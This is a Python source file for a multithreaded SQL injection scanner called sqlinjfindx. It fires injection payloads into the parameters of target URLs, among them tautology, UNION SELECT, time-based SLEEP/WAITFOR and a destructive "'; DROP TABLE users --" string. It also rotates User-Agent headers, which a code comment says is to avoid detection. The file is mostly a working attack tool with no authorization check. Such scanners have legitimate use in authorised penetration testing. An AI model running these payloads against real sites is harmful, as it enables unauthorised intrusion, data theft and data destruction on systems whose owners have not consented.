import requests
import argparse
import re
import random
import logging
import json
import csv
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from tqdm import tqdm

# SQL Injection payloads to test
sql_payloads = [
    "' OR '1'='1", 
    "' OR '1'='1' --", 
    "' OR 1=1--", 
    '" OR "1"="1',
    '1 OR 1=1',
    "' AND 1=2 UNION SELECT null,null,null --",
    "admin' --",
    "'; DROP TABLE users --",
    "' OR 'x'='x",
]

# Time-based blind SQL payloads
blind_sql_payloads = [
    "'; WAITFOR DELAY '0:0:5' --",
    "'; SLEEP(5) --",
    '"; SLEEP(5) --',
    "' OR IF(1=1,SLEEP(5),0)--",
]

# List of common User-Agents to avoid basic detection
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
]

# Configure logging
logging.basicConfig(filename="sqlinjfindx.log", level=logging.INFO, 
                    format="%(asctime)s - %(message)s", filemode="w")

def print_banner():
    banner = r'''
    ========================================
    sqlinjfindx - SQL Injection Scanner v1.5
            --by root0emir--

             _  _           _   __  _             _       
            | |(_)         (_) / _|(_)           | |      
 ___   __ _ | | _  _ __     _ | |_  _  _ __    __| |__  __
/ __| / _` || || || '_ \   | ||  _|| || '_ \  / _` |\ \/ /
\__ \| (_| || || || | | |  | || |  | || | | || (_| | >  < 
|___/ \__, ||_||_||_| |_|  | ||_|  |_||_| |_| \__,_|/_/\_\
         | |              _/ |                            
         |_|             |__/                             
    ========================================
    '''
    print(colored(banner, 'green'))

# Scan for SQL Injection vulnerabilities
def scan_for_sql_injection(url, method, params, headers, blind=False, verbose=0):
    headers['User-Agent'] = random.choice(user_agents)
    payloads = blind_sql_payloads if blind else sql_payloads

    for payload in tqdm(payloads, desc="Testing payloads"):
        test_params = {key: f"{value}{payload}" for key, value in params.items()}
        try:
            # Send the request
            if method == "GET":
                response = requests.get(url, params=test_params, headers=headers, timeout=5)
            else:
                response = requests.post(url, data=test_params, headers=headers, timeout=5)
            
            # Show detailed response in verbose mode
            if verbose:
                print(f"Testing {url} with payload: {payload}")
                print(f"Status Code: {response.status_code}")
                print(f"Response Time: {response.elapsed.total_seconds()} seconds")
            
            # Check for SQL errors or long delays for blind SQLi
            if re.search(r"(sql syntax|mysql_fetch_array|ORA-01756|error in your SQL syntax|invalid query)", response.text, re.I) or (blind and response.elapsed.total_seconds() >= 5):
                print(colored(f"[!] SQL Injection vulnerability found with payload: {payload}", 'red'))
                logging.info(f"Vulnerable URL: {url} | Payload: {payload}")
                return {"url": url, "payload": payload}
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Request failed: {e}", 'yellow'))
            logging.error(f"Request failed for {url}: {e}")
    return None

# Save the results to output file or print to screen
def save_result(output_file, result):
    if output_file:
        if output_file.endswith(".json"):
            with open(output_file, "a") as f:
                json.dump(result, f)
                f.write("\n")
        elif output_file.endswith(".csv"):
            with open(output_file, "a", newline='') as f:
                writer = csv.writer(f)
                writer.writerow(result.values())
        else:
            with open(output_file, "a") as f:
                f.write(f"{result}\n")
    else:
        # Print the result if no file is specified
        print(colored(f"Result:\n{result}", 'green'))

# Worker function for each URL
def worker(url, method, params, headers, blind, verbose, output_file):
    print(f"Scanning URL: {url} with parameters {params}")
    result = scan_for_sql_injection(url, method, params, headers, blind, verbose)
    if result:
        save_result(output_file, result)
        print(colored(f"Vulnerability found and saved to {output_file}", 'green') if output_file else colored("Vulnerability displayed on screen", 'green'))

# Parse query string for GET parameters
def parse_query_string(query):
    params = {}
    if "?" in query:
        query = query.split("?")[1]
    for pair in query.split("&"):
        key, value = pair.split("=")
        params[key] = value
    return params

# Main program
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="sqlinjfindx - Enhanced SQL Injection Vulnerability Scanner")
    parser.add_argument("url", help="Target URL with parameters (e.g., http://example.com/page?id=1) or a file with URLs")
    parser.add_argument("-o", "--output", help="File to save results (supports .txt, .json, or .csv)", default=None)
    parser.add_argument("-m", "--method", help="HTTP method (GET or POST)", default="GET", choices=["GET", "POST"])
    parser.add_argument("-t", "--timeout", help="Request timeout in seconds", default=5, type=int)
    parser.add_argument("-H", "--header", help="Custom header(s) in key=value format (e.g., Authorization=Bearer token123)", action='append')
    parser.add_argument("-v", "--verbose", help="Enable verbose output", action="store_true")
    parser.add_argument("-b", "--blind", help="Enable Blind SQL Injection scanning", action="store_true")
    parser.add_argument("-T", "--threads", help="Number of threads to use for scanning multiple URLs", default=1, type=int)
    args = parser.parse_args()

    print_banner()

    headers = {}
    if args.header:
        for h in args.header:
            k, v = h.split("=", 1)
            headers[k] = v

    url_list = []
    
    # Load URLs from file or single URL
    if args.url.endswith(".txt"):
        with open(args.url, "r") as f:
            url_list = f.read().splitlines()
    else:
        url_list = [args.url]
    
    # Use ThreadPoolExecutor for parallel scans
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for url in url_list:
            params = parse_query_string(url)
            executor.submit(worker, url, args.method, params, headers, args.blind, args.verbose, args.output)

    print(colored("*** Scanning completed ***", 'green'))

